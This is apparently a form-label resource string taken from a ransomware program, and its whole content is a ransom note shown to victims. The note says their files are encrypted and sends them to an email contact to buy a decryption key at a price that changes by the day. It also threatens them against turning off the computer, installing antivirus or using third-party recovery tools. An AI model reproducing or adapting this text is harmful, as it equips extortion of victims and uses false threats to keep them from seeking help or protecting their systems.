data.name: label3.Text
data.value:
Your documents, such as videos, musics, images and other important files are safely encrypted! This means that they cannot be accessed until the decryption process applied.
In order to decrypt your files, you must contact the email provided below. You have to specify your personnal IDKEY in the subject of your message too. (The IDKEY can be found on your desktop as the "IDKEY" file, open it with notepad). The price of your personnal decryption key can vary depending on the day.
Once you purchased you decryption key, please enter it below.
DO NOT: - Turn off your computer. Your files will be encrypted forever. - Rename any encrypted files, this can damage them forever. - Do not install an antivirus, or try to remove this program. (Your data will be gone too). - Do not try to decrypt your files with any third-party software. This may corrupt them.
